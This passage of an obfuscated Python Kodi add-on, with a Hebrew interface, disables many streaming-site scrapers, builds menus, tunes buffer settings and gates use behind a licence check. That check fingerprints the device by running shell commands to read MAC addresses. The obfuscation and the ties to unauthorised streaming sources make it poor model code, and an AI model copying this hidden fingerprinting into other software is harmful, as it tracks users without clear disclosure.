		OO0O00OOO000O00O0 .setSetting ('provider.movie4k','false')#line:1938
		OO0O00OOO000O00O0 .setSetting ('provider.movie4kis','false')#line:1939
		OO0O00OOO000O00O0 .setSetting ('provider.movieneo','false')#line:1940
		OO0O00OOO000O00O0 .setSetting ('provider.moviesever','false')#line:1941
		OO0O00OOO000O00O0 .setSetting ('provider.movietown','false')#line:1942
		OO0O00OOO000O00O0 .setSetting ('provider.mvrls','false')#line:1944
		OO0O00OOO000O00O0 .setSetting ('provider.netzkino','false')#line:1945
		OO0O00OOO000O00O0 .setSetting ('provider.odb','false')#line:1946
		OO0O00OOO000O00O0 .setSetting ('provider.openkatalog','false')#line:1947
		OO0O00OOO000O00O0 .setSetting ('provider.ororo','false')#line:1948
		OO0O00OOO000O00O0 .setSetting ('provider.paczamy','false')#line:1949
		OO0O00OOO000O00O0 .setSetting ('provider.peliculasdk','false')#line:1950
		OO0O00OOO000O00O0 .setSetting ('provider.pelisplustv','false')#line:1951
		OO0O00OOO000O00O0 .setSetting ('provider.pepecine','false')#line:1952
		OO0O00OOO000O00O0 .setSetting ('provider.primewire','false')#line:1953
		OO0O00OOO000O00O0 .setSetting ('provider.projectfreetv','false')#line:1954
		OO0O00OOO000O00O0 .setSetting ('provider.proxer','false')#line:1955
		OO0O00OOO000O00O0 .setSetting ('provider.pureanime','false')#line:1956
		OO0O00OOO000O00O0 .setSetting ('provider.putlocker','false')#line:1957
		OO0O00OOO000O00O0 .setSetting ('provider.putlockerfree','false')#line:1958
		OO0O00OOO000O00O0 .setSetting ('provider.reddit','false')#line:1959
		OO0O00OOO000O00O0 .setSetting ('provider.cartoonwire','false')#line:1960
		OO0O00OOO000O00O0 .setSetting ('provider.seehd','false')#line:1961
		OO0O00OOO000O00O0 .setSetting ('provider.segos','false')#line:1962
		OO0O00OOO000O00O0 .setSetting ('provider.serienstream','false')#line:1963
		OO0O00OOO000O00O0 .setSetting ('provider.series9','false')#line:1964
		OO0O00OOO000O00O0 .setSetting ('provider.seriesever','false')#line:1965
		OO0O00OOO000O00O0 .setSetting ('provider.seriesonline','false')#line:1966
		OO0O00OOO000O00O0 .setSetting ('provider.seriespapaya','false')#line:1967
		OO0O00OOO000O00O0 .setSetting ('provider.sezonlukdizi','false')#line:1968
		OO0O00OOO000O00O0 .setSetting ('provider.solarmovie','false')#line:1969
		OO0O00OOO000O00O0 .setSetting ('provider.solarmoviez','false')#line:1970
		OO0O00OOO000O00O0 .setSetting ('provider.stream-to','false')#line:1971
		OO0O00OOO000O00O0 .setSetting ('provider.streamdream','false')#line:1972
		OO0O00OOO000O00O0 .setSetting ('provider.streamflix','false')#line:1973
		OO0O00OOO000O00O0 .setSetting ('provider.streamit','false')#line:1974
		OO0O00OOO000O00O0 .setSetting ('provider.swatchseries','false')#line:1975
		OO0O00OOO000O00O0 .setSetting ('provider.szukajkatv','false')#line:1976
		OO0O00OOO000O00O0 .setSetting ('provider.tainiesonline','false')#line:1977
		OO0O00OOO000O00O0 .setSetting ('provider.tainiomania','false')#line:1978
		OO0O00OOO000O00O0 .setSetting ('provider.tata','false')#line:1981
		OO0O00OOO000O00O0 .setSetting ('provider.trt','false')#line:1982
		OO0O00OOO000O00O0 .setSetting ('provider.tvbox','false')#line:1983
		OO0O00OOO000O00O0 .setSetting ('provider.ultrahd','false')#line:1984
		OO0O00OOO000O00O0 .setSetting ('provider.video4k','false')#line:1985
		OO0O00OOO000O00O0 .setSetting ('provider.vidics','false')#line:1986
		OO0O00OOO000O00O0 .setSetting ('provider.view4u','false')#line:1987
		OO0O00OOO000O00O0 .setSetting ('provider.watchseries','false')#line:1988
		OO0O00OOO000O00O0 .setSetting ('provider.xrysoi','false')#line:1989
		OO0O00OOO000O00O0 .setSetting ('provider.library','false')#line:1990
def fixfont ():#line:1993
	OO0O0O0O0OOO0000O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1994
	O0OO0O000OO0OOO00 =json .loads (OO0O0O0O0OOO0000O );#line:1996
	OO00OO0000OO0O00O =O0OO0O000OO0OOO00 ["result"]["settings"]#line:1997
	O000O0OOO000000O0 =[OOOOOO00OO0OO0000 for OOOOOO00OO0OO0000 in OO00OO0000OO0O00O if OOOOOO00OO0OO0000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1999
	O00OO00000OO0O000 =O000O0OOO000000O0 ["options"];#line:2000
	OO0OO000000OOO0OO =O000O0OOO000000O0 ["value"];#line:2001
	O0OO000OOOO0000O0 =[O00OOOO0O0OO00O00 for (O00OOOO0O0OO00O00 ,O0OO000O00000O0OO )in enumerate (O00OO00000OO0O000 )if O0OO000O00000O0OO ["value"]==OO0OO000000OOO0OO ][0 ];#line:2003
	O00000000OO0OO0O0 =(O0OO000OOOO0000O0 +1 )%len (O00OO00000OO0O000 )#line:2005
	OOO0OO0O0OOOO0O00 =O00OO00000OO0O000 [O00000000OO0OO0O0 ]["value"]#line:2007
	OOOOO00O0OO00OO0O =O00OO00000OO0O000 [O00000000OO0OO0O0 ]["label"]#line:2008
	O000OO0OO0O00OOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2010
	try :#line:2012
		OOO000OOOOO00OO00 =json .loads (O000OO0OO0O00OOOO );#line:2013
		if OOO000OOOOO00OO00 ["result"]!=True :#line:2015
			raise Exception #line:2016
	except :#line:2017
		sys .stderr .write ("Error switching audio output device")#line:2018
		raise Exception #line:2019
def parseDOM2 (O000OO0O00000O000 ,name =u"",attrs ={},ret =False ):#line:2020
	if isinstance (O000OO0O00000O000 ,str ):#line:2023
		try :#line:2024
			O000OO0O00000O000 =[O000OO0O00000O000 .decode ("utf-8")]#line:2025
		except :#line:2026
			O000OO0O00000O000 =[O000OO0O00000O000 ]#line:2027
	elif isinstance (O000OO0O00000O000 ,unicode ):#line:2028
		O000OO0O00000O000 =[O000OO0O00000O000 ]#line:2029
	elif not isinstance (O000OO0O00000O000 ,list ):#line:2030
		return u""#line:2031
	if not name .strip ():#line:2033
		return u""#line:2034
	OO0000000O00O0OO0 =[]#line:2036
	for OO0O0OO0O00O000OO in O000OO0O00000O000 :#line:2037
		OO00OO000OOO0OOOO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0O0OO0O00O000OO )#line:2038
		for OO0000OOOOOOO0O0O in OO00OO000OOO0OOOO :#line:2039
			OO0O0OO0O00O000OO =OO0O0OO0O00O000OO .replace (OO0000OOOOOOO0O0O ,OO0000OOOOOOO0O0O .replace ("\n"," "))#line:2040
		O0000O000OOO00O0O =[]#line:2042
		for O00O0OOOO00OOOOOO in attrs :#line:2043
			O0O00OOO0000O00OO =re .compile ('(<'+name +'[^>]*?(?:'+O00O0OOOO00OOOOOO +'=[\'"]'+attrs [O00O0OOOO00OOOOOO ]+'[\'"].*?>))',re .M |re .S ).findall (OO0O0OO0O00O000OO )#line:2044
			if len (O0O00OOO0000O00OO )==0 and attrs [O00O0OOOO00OOOOOO ].find (" ")==-1 :#line:2045
				O0O00OOO0000O00OO =re .compile ('(<'+name +'[^>]*?(?:'+O00O0OOOO00OOOOOO +'='+attrs [O00O0OOOO00OOOOOO ]+'.*?>))',re .M |re .S ).findall (OO0O0OO0O00O000OO )#line:2046
			if len (O0000O000OOO00O0O )==0 :#line:2048
				O0000O000OOO00O0O =O0O00OOO0000O00OO #line:2049
				O0O00OOO0000O00OO =[]#line:2050
			else :#line:2051
				O00OO00OO0OOOOO00 =range (len (O0000O000OOO00O0O ))#line:2052
				O00OO00OO0OOOOO00 .reverse ()#line:2053
				for O0000OO0O0O0O000O in O00OO00OO0OOOOO00 :#line:2054
					if not O0000O000OOO00O0O [O0000OO0O0O0O000O ]in O0O00OOO0000O00OO :#line:2055
						del (O0000O000OOO00O0O [O0000OO0O0O0O000O ])#line:2056
		if len (O0000O000OOO00O0O )==0 and attrs =={}:#line:2058
			O0000O000OOO00O0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0O0OO0O00O000OO )#line:2059
			if len (O0000O000OOO00O0O )==0 :#line:2060
				O0000O000OOO00O0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0O0OO0O00O000OO )#line:2061
		if isinstance (ret ,str ):#line:2063
			O0O00OOO0000O00OO =[]#line:2064
			for OO0000OOOOOOO0O0O in O0000O000OOO00O0O :#line:2065
				OOOO000OO0000000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0000OOOOOOO0O0O )#line:2066
				if len (OOOO000OO0000000O )==0 :#line:2067
					OOOO000OO0000000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0000OOOOOOO0O0O )#line:2068
				for OO00OOOOO00O0O00O in OOOO000OO0000000O :#line:2069
					O0OOO0O0O00O0OO0O =OO00OOOOO00O0O00O [0 ]#line:2070
					if O0OOO0O0O00O0OO0O in "'\"":#line:2071
						if OO00OOOOO00O0O00O .find ('='+O0OOO0O0O00O0OO0O ,OO00OOOOO00O0O00O .find (O0OOO0O0O00O0OO0O ,1 ))>-1 :#line:2072
							OO00OOOOO00O0O00O =OO00OOOOO00O0O00O [:OO00OOOOO00O0O00O .find ('='+O0OOO0O0O00O0OO0O ,OO00OOOOO00O0O00O .find (O0OOO0O0O00O0OO0O ,1 ))]#line:2073
						if OO00OOOOO00O0O00O .rfind (O0OOO0O0O00O0OO0O ,1 )>-1 :#line:2075
							OO00OOOOO00O0O00O =OO00OOOOO00O0O00O [1 :OO00OOOOO00O0O00O .rfind (O0OOO0O0O00O0OO0O )]#line:2076
					else :#line:2077
						if OO00OOOOO00O0O00O .find (" ")>0 :#line:2078
							OO00OOOOO00O0O00O =OO00OOOOO00O0O00O [:OO00OOOOO00O0O00O .find (" ")]#line:2079
						elif OO00OOOOO00O0O00O .find ("/")>0 :#line:2080
							OO00OOOOO00O0O00O =OO00OOOOO00O0O00O [:OO00OOOOO00O0O00O .find ("/")]#line:2081
						elif OO00OOOOO00O0O00O .find (">")>0 :#line:2082
							OO00OOOOO00O0O00O =OO00OOOOO00O0O00O [:OO00OOOOO00O0O00O .find (">")]#line:2083
					O0O00OOO0000O00OO .append (OO00OOOOO00O0O00O .strip ())#line:2085
			O0000O000OOO00O0O =O0O00OOO0000O00OO #line:2086
		else :#line:2087
			O0O00OOO0000O00OO =[]#line:2088
			for OO0000OOOOOOO0O0O in O0000O000OOO00O0O :#line:2089
				OOOOO0000OOOO0OO0 =u"</"+name #line:2090
				OOO00O00O00OOOO0O =OO0O0OO0O00O000OO .find (OO0000OOOOOOO0O0O )#line:2092
				O00000000000O0OO0 =OO0O0OO0O00O000OO .find (OOOOO0000OOOO0OO0 ,OOO00O00O00OOOO0O )#line:2093
				O000OOOO000O00O0O =OO0O0OO0O00O000OO .find ("<"+name ,OOO00O00O00OOOO0O +1 )#line:2094
				while O000OOOO000O00O0O <O00000000000O0OO0 and O000OOOO000O00O0O !=-1 :#line:2096
					O0OOOO00O0000O00O =OO0O0OO0O00O000OO .find (OOOOO0000OOOO0OO0 ,O00000000000O0OO0 +len (OOOOO0000OOOO0OO0 ))#line:2097
					if O0OOOO00O0000O00O !=-1 :#line:2098
						O00000000000O0OO0 =O0OOOO00O0000O00O #line:2099
					O000OOOO000O00O0O =OO0O0OO0O00O000OO .find ("<"+name ,O000OOOO000O00O0O +1 )#line:2100
				if OOO00O00O00OOOO0O ==-1 and O00000000000O0OO0 ==-1 :#line:2102
					O0O0OOO00OOOO000O =u""#line:2103
				elif OOO00O00O00OOOO0O >-1 and O00000000000O0OO0 >-1 :#line:2104
					O0O0OOO00OOOO000O =OO0O0OO0O00O000OO [OOO00O00O00OOOO0O +len (OO0000OOOOOOO0O0O ):O00000000000O0OO0 ]#line:2105
				elif O00000000000O0OO0 >-1 :#line:2106
					O0O0OOO00OOOO000O =OO0O0OO0O00O000OO [:O00000000000O0OO0 ]#line:2107
				elif OOO00O00O00OOOO0O >-1 :#line:2108
					O0O0OOO00OOOO000O =OO0O0OO0O00O000OO [OOO00O00O00OOOO0O +len (OO0000OOOOOOO0O0O ):]#line:2109
				if ret :#line:2111
					OOOOO0000OOOO0OO0 =OO0O0OO0O00O000OO [O00000000000O0OO0 :OO0O0OO0O00O000OO .find (">",OO0O0OO0O00O000OO .find (OOOOO0000OOOO0OO0 ))+1 ]#line:2112
					O0O0OOO00OOOO000O =OO0000OOOOOOO0O0O +O0O0OOO00OOOO000O +OOOOO0000OOOO0OO0 #line:2113
				OO0O0OO0O00O000OO =OO0O0OO0O00O000OO [OO0O0OO0O00O000OO .find (O0O0OOO00OOOO000O ,OO0O0OO0O00O000OO .find (OO0000OOOOOOO0O0O ))+len (O0O0OOO00OOOO000O ):]#line:2115
				O0O00OOO0000O00OO .append (O0O0OOO00OOOO000O )#line:2116
			O0000O000OOO00O0O =O0O00OOO0000O00OO #line:2117
		OO0000000O00O0OO0 +=O0000O000OOO00O0O #line:2118
	return OO0000000O00O0OO0 #line:2120
def addItem (OO00000O0O00OO000 ,O00O0000O0000OO00 ,O0OO000000OOOOO00 ,OO000OOOO000OOO0O ,O00O000OO0OOO000O ,description =None ):#line:2122
	if description ==None :description =''#line:2123
	description ='[COLOR white]'+description +'[/COLOR]'#line:2124
	O0OO00000O00000O0 =sys .argv [0 ]+"?url="+urllib .quote_plus (O00O0000O0000OO00 )+"&mode="+str (O0OO000000OOOOO00 )+"&name="+urllib .quote_plus (OO00000O0O00OO000 )+"&iconimage="+urllib .quote_plus (OO000OOOO000OOO0O )+"&fanart="+urllib .quote_plus (O00O000OO0OOO000O )#line:2125
	O00O0OO00000O0O0O =True #line:2126
	OO00O0O00O0OO0O00 =xbmcgui .ListItem (OO00000O0O00OO000 ,iconImage =OO000OOOO000OOO0O ,thumbnailImage =OO000OOOO000OOO0O )#line:2127
	OO00O0O00O0OO0O00 .setInfo (type ="Video",infoLabels ={"Title":OO00000O0O00OO000 ,"Plot":description })#line:2128
	OO00O0O00O0OO0O00 .setProperty ("fanart_Image",O00O000OO0OOO000O )#line:2129
	OO00O0O00O0OO0O00 .setProperty ("icon_Image",OO000OOOO000OOO0O )#line:2130
	O00O0OO00000O0O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO00000O00000O0 ,listitem =OO00O0O00O0OO0O00 ,isFolder =False )#line:2131
	return O00O0OO00000O0O0O #line:2132
def get_params ():#line:2134
		OO0O0O000O000O000 =[]#line:2135
		OOO0OOO0000OO0O00 =sys .argv [2 ]#line:2136
		if len (OOO0OOO0000OO0O00 )>=2 :#line:2137
				O0O00000OO00O0O00 =sys .argv [2 ]#line:2138
				O0O0OOOO0O0O0O00O =O0O00000OO00O0O00 .replace ('?','')#line:2139
				if (O0O00000OO00O0O00 [len (O0O00000OO00O0O00 )-1 ]=='/'):#line:2140
						O0O00000OO00O0O00 =O0O00000OO00O0O00 [0 :len (O0O00000OO00O0O00 )-2 ]#line:2141
				O00O0000OO0OO00OO =O0O0OOOO0O0O0O00O .split ('&')#line:2142
				OO0O0O000O000O000 ={}#line:2143
				for O0OOO00000OO00OOO in range (len (O00O0000OO0OO00OO )):#line:2144
						O0O00O0OOO0OOO0O0 ={}#line:2145
						O0O00O0OOO0OOO0O0 =O00O0000OO0OO00OO [O0OOO00000OO00OOO ].split ('=')#line:2146
						if (len (O0O00O0OOO0OOO0O0 ))==2 :#line:2147
								OO0O0O000O000O000 [O0O00O0OOO0OOO0O0 [0 ]]=O0O00O0OOO0OOO0O0 [1 ]#line:2148
		return OO0O0O000O000O000 #line:2150
def decode (OO0OO0OO00O0OO00O ,OOO0O0OO00O00OO00 ):#line:2155
    import base64 #line:2156
    OOO00O00OOOO00OO0 =[]#line:2157
    if (len (OO0OO0OO00O0OO00O ))!=4 :#line:2159
     return 10 #line:2160
    OOO0O0OO00O00OO00 =base64 .urlsafe_b64decode (OOO0O0OO00O00OO00 )#line:2161
    for O0O0OO0OO0OO0O000 in range (len (OOO0O0OO00O00OO00 )):#line:2163
        OOO0O0O00OO000OOO =OO0OO0OO00O0OO00O [O0O0OO0OO0OO0O000 %len (OO0OO0OO00O0OO00O )]#line:2164
        O00OOO00000OOOOO0 =chr ((256 +ord (OOO0O0OO00O00OO00 [O0O0OO0OO0OO0O000 ])-ord (OOO0O0O00OO000OOO ))%256 )#line:2165
        OOO00O00OOOO00OO0 .append (O00OOO00000OOOOO0 )#line:2166
    return "".join (OOO00O00OOOO00OO0 )#line:2167
def tmdb_list (OOO0OO0OOO0O0000O ):#line:2168
    OOOOOOO0OO0OOOO00 =decode ("7643",OOO0OO0OOO0O0000O )#line:2171
    return int (OOOOOOO0OO0OOOO00 )#line:2174
def u_list (OOO00000O00000OO0 ):#line:2175
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2177
        from math import sqrt #line:2178
        O000000000000OO0O =tmdb_list (TMDB_NEW_API )#line:2179
        O0OOOOOOOOOO0OO00 =str ((getHwAddr ('eth0'))*O000000000000OO0O )#line:2181
        OO00O0OO00OO0000O =int (O0OOOOOOOOOO0OO00 [1 ]+O0OOOOOOOOOO0OO00 [2 ]+O0OOOOOOOOOO0OO00 [5 ]+O0OOOOOOOOOO0OO00 [7 ])#line:2182
        OOO0OOO0OOO0O00O0 =(ADDON .getSetting ("pass"))#line:2184
        OOOO0O0O0OO000OOO =(str (round (sqrt ((OO00O0OO00OO0000O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:2189
        if '.'in OOOO0O0O0OO000OOO :#line:2191
         OOOO0O0O0OO000OOO =(str (round (sqrt ((OO00O0OO00OO0000O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:2192
        if OOO0OOO0OOO0O00O0 ==OOOO0O0O0OO000OOO :#line:2194
          OO0OO0OO00OO0OOOO =OOO00000O00000OO0 #line:2196
        else :#line:2198
           if STARTP2 ()and STARTP ()=='ok':#line:2199
             return OOO00000O00000OO0 #line:2202
           OO0OO0OO00OO0OOOO ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2203
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2204
           sys .exit ()#line:2205
        return OO0OO0OO00OO0OOOO #line:2206
    else :#line:2207
        STARTP ()#line:2208
def disply_hwr ():#line:2212
   try :#line:2213
    OOOO0OO00O0O0O000 =tmdb_list (TMDB_NEW_API )#line:2214
    OOOOO0OOOOO00OOOO =str ((getHwAddr ('eth0'))*OOOO0OO00O0O0O000 )#line:2215
    OOOOO0OOO0000O000 =(OOOOO0OOOOO00OOOO [1 ]+OOOOO0OOOOO00OOOO [2 ]+OOOOO0OOOOO00OOOO [5 ]+OOOOO0OOOOO00OOOO [7 ])#line:2222
    OOO000OOO0O0OOOO0 =(ADDON .getSetting ("action"))#line:2223
    wiz .setS ('action',str (OOOOO0OOO0000O000 ))#line:2225
   except :pass #line:2226
def disply_hwr2 ():#line:2227
   try :#line:2228
    OOO00O0O0OOO00O0O =tmdb_list (TMDB_NEW_API )#line:2229
    O0OOOOOOO000O0000 =str ((getHwAddr ('eth0'))*OOO00O0O0OOO00O0O )#line:2231
    O00O00O0O000OO000 =(O0OOOOOOO000O0000 [1 ]+O0OOOOOOO000O0000 [2 ]+O0OOOOOOO000O0000 [5 ]+O0OOOOOOO000O0000 [7 ])#line:2240
    O000OO0O00OO0OO0O =(ADDON .getSetting ("action"))#line:2241
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00O00O0O000OO000 )#line:2244
   except :pass #line:2245
def getHwAddr (OOOOO000000O0OO0O ):#line:2247
   import subprocess ,time #line:2248
   O0OOO00OOOOO0O00O ='windows'#line:2249
   if xbmc .getCondVisibility ('system.platform.android'):#line:2250
       O0OOO00OOOOO0O00O ='android'#line:2251
   if xbmc .getCondVisibility ('system.platform.android'):#line:2252
     O00OOO0O0O00O0000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2253
     O00O0O000OO0000O0 =re .compile ('link/ether (.+?) brd').findall (str (O00OOO0O0O00O0000 ))#line:2255
     O00OOOOOO0OOO0OOO =0 #line:2256
     for OOOOO0O00000O0OOO in O00O0O000OO0000O0 :#line:2257
      if O00O0O000OO0000O0 !='00:00:00:00:00:00':#line:2258
          OO0O000O0O0OOO0OO =OOOOO0O00000O0OOO #line:2259
          O00OOOOOO0OOO0OOO =O00OOOOOO0OOO0OOO +int (OO0O000O0O0OOO0OO .replace (':',''),16 )#line:2260
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2262
       O0O0O00OO0OO00OO0 =0 #line:2263
       O00OOOOOO0OOO0OOO =0 #line:2264
       OOOOO000O00OO0000 =[]#line:2265
       O0O00OOO00O0O0000 =os .popen ("getmac").read ()#line:2266
       O0O00OOO00O0O0000 =O0O00OOO00O0O0000 .split ("\n")#line:2267
       for O0OOOOO0000000000 in O0O00OOO00O0O0000 :#line:2269
            O00O0O0OOO0OOOO00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0OOOOO0000000000 ,re .I )#line:2270
            if O00O0O0OOO0OOOO00 :#line:2271
                O00O0O000OO0000O0 =O00O0O0OOO0OOOO00 .group ().replace ('-',':')#line:2272
                OOOOO000O00OO0000 .append (O00O0O000OO0000O0 )#line:2273
                O00OOOOOO0OOO0OOO =O00OOOOOO0OOO0OOO +int (O00O0O000OO0000O0 .replace (':',''),16 )#line:2276
   else :#line:2278
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2279
   try :#line:2296
    return O00OOOOOO0OOO0OOO #line:2297
   except :pass #line:2298
def getpass ():#line:2299
	disply_hwr2 ()#line:2301
def setpass ():#line:2302
    O00000OOOO0OOO000 =xbmcgui .Dialog ()#line:2303
    OOOO0OOO00OOOOO0O =''#line:2304
    OOOOO0000OOOO0O00 =xbmc .Keyboard (OOOO0OOO00OOOOO0O ,'הכנס סיסמה')#line:2306
    OOOOO0000OOOO0O00 .doModal ()#line:2307
    if OOOOO0000OOOO0O00 .isConfirmed ():#line:2308
           OOOOO0000OOOO0O00 =OOOOO0000OOOO0O00 .getText ()#line:2309
    wiz .setS ('pass',str (OOOOO0000OOOO0O00 ))#line:2310
def setuname ():#line:2311
    OO0OOO000OO0OOO0O =''#line:2312
    O000OO0O00OO000O0 =xbmc .Keyboard (OO0OOO000OO0OOO0O ,'הכנס שם משתמש')#line:2313
    O000OO0O00OO000O0 .doModal ()#line:2314
    if O000OO0O00OO000O0 .isConfirmed ():#line:2315
           OO0OOO000OO0OOO0O =O000OO0O00OO000O0 .getText ()#line:2316
           wiz .setS ('user',str (OO0OOO000OO0OOO0O ))#line:2317
def powerkodi ():#line:2318
    os ._exit (1 )#line:2319
def buffer1 ():#line:2321
	OOOOOO0OOOOO0O0OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2322
	OO00OO0OO0OOO0OOO =xbmc .getInfoLabel ("System.Memory(total)")#line:2323
	OOO00O0O0000OO0O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:2324
	OOO0OO00000000000 =re .sub ('[^0-9]','',OOO00O0O0000OO0O0 )#line:2325
	OOO0OO00000000000 =int (OOO0OO00000000000 )/3 #line:2326
	O0OOO0O000O000OO0 =OOO0OO00000000000 *1024 *1024 #line:2327
	try :OO0000O0OO0000O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2328
	except :OO0000O0OO0000O0O =16 #line:2329
	OOOO000OOO000OOOO =DIALOG .yesno ('FREE MEMORY: '+str (OOO00O0O0000OO0O0 ),'Based on your free Memory your optimal buffersize is: '+str (OOO0OO00000000000 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2332
	if OOOO000OOO000OOOO ==1 :#line:2333
		with open (OOOOOO0OOOOO0O0OO ,"w")as OOO0OOO0O00O0OOOO :#line:2334
			if OO0000O0OO0000O0O >=17 :OO00OOO000OO0OO00 =xml_data_advSettings_New (str (O0OOO0O000O000OO0 ))#line:2335
			else :OO00OOO000OO0OO00 =xml_data_advSettings_old (str (O0OOO0O000O000OO0 ))#line:2336
			OOO0OOO0O00O0OOOO .write (OO00OOO000OO0OO00 )#line:2338
			DIALOG .ok ('Buffer Size Set to: '+str (O0OOO0O000O000OO0 ),'Please restart Kodi for settings to apply.','')#line:2339
	elif OOOO000OOO000OOOO ==0 :#line:2341
		O0OOO0O000O000OO0 =_OOO000OOOOOOO0000 (default =str (O0OOO0O000O000OO0 ),heading ="INPUT BUFFER SIZE")#line:2342
		with open (OOOOOO0OOOOO0O0OO ,"w")as OOO0OOO0O00O0OOOO :#line:2343
			if OO0000O0OO0000O0O >=17 :OO00OOO000OO0OO00 =xml_data_advSettings_New (str (O0OOO0O000O000OO0 ))#line:2344
			else :OO00OOO000OO0OO00 =xml_data_advSettings_old (str (O0OOO0O000O000OO0 ))#line:2345
			OOO0OOO0O00O0OOOO .write (OO00OOO000OO0OO00 )#line:2346
			DIALOG .ok ('Buffer Size Set to: '+str (O0OOO0O000O000OO0 ),'Please restart Kodi for settings to apply.','')#line:2347
def xml_data_advSettings_old (O0O0OO00O0000OOOO ):#line:2348
	OO0OOOO000O0O0O00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0O0OO00O0000OOOO #line:2358
	return OO0OOOO000O0O0O00 #line:2359
def xml_data_advSettings_New (O00O0O00OOO0OOOO0 ):#line:2361
	O000OOOOOOO0000OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00O0O00OOO0OOOO0 #line:2373
	return O000OOOOOOO0000OO #line:2374
def write_ADV_SETTINGS_XML (OOOOOO0O0OOOOO0O0 ):#line:2375
    if not os .path .exists (xml_file ):#line:2376
        with open (xml_file ,"w")as OOOO00OOO00OOO00O :#line:2377
            OOOO00OOO00OOO00O .write (xml_data )#line:2378
def _OOO000OOOOOOO0000 (default ="",heading ="",hidden =False ):#line:2379
    ""#line:2380
    O00O0O0000000O0O0 =xbmc .Keyboard (default ,heading ,hidden )#line:2381
    O00O0O0000000O0O0 .doModal ()#line:2382
    if (O00O0O0000000O0O0 .isConfirmed ()):#line:2383
        return unicode (O00O0O0000000O0O0 .getText (),"utf-8")#line:2384
    return default #line:2385
def index ():#line:2387
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2388
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2389
	if AUTOUPDATE =='Yes':#line:2390
		if wiz .workingURL (WIZARDFILE )==True :#line:2391
			OO0OOO00O0000O00O =wiz .checkWizard ('version')#line:2392
			if OO0OOO00O0000O00O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO0OOO00O0000O00O ),'wizardupdate',themeit =THEME2 )#line:2393
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2394
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2395
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2396
	if len (BUILDNAME )>0 :#line:2397
		OO00O00OOO00OOO00 =wiz .checkBuild (BUILDNAME ,'version')#line:2398
		OO0OO0O0O00OO0OO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2399
		if OO00O00OOO00OOO00 >BUILDVERSION :OO0OO0O0O00OO0OO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO0OO0O0O00OO0OO0 ,OO00O00OOO00OOO00 )#line:2400
		addDir (OO0OO0O0O00OO0OO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2402
		try :#line:2404
		     OOOOO00000000O00O =wiz .themeCount (BUILDNAME )#line:2405
		except :#line:2406
		   OOOOO00000000O00O =False #line:2407
		if not OOOOO00000000O00O ==False :#line:2408
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2409
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2410
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2413
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2414
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2415
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2419
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2421
